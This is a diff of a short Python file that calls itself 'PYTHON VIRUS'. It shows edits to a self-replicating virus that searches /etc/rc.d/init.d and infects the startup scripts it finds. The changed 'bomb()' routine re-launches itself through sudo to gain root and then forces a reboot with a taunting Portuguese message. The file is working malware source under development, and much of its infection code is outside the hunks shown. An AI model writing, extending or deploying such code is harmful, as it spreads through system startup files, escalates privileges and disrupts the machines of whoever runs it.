@@ -1,5 +1,6 @@
 #!/usr/bin/python
 import os
+import sys
 import datetime
 SIGNATURE = "PYTHON VIRUS"
 
@@ -35,7 +36,11 @@ def infect(filestoinfect):
         f.close()
 
 def bomb():
-        os.exec("shutdown -r 3 Seu computador será reiniciado... DENOVO")
+        euid = os.geteuid()
+        if euid != 0:
+            args = ['sudo', sys.executable] + sys.argv + [os.environ]
+            os.execlpe('sudo', *args)
+        os.system("shutdown -r 1 Seu computador será reiniciado... DENOVO")
 
 filestoinfect = search(os.path.abspath("/etc/rc.d/init.d"))
 infect(filestoinfect)
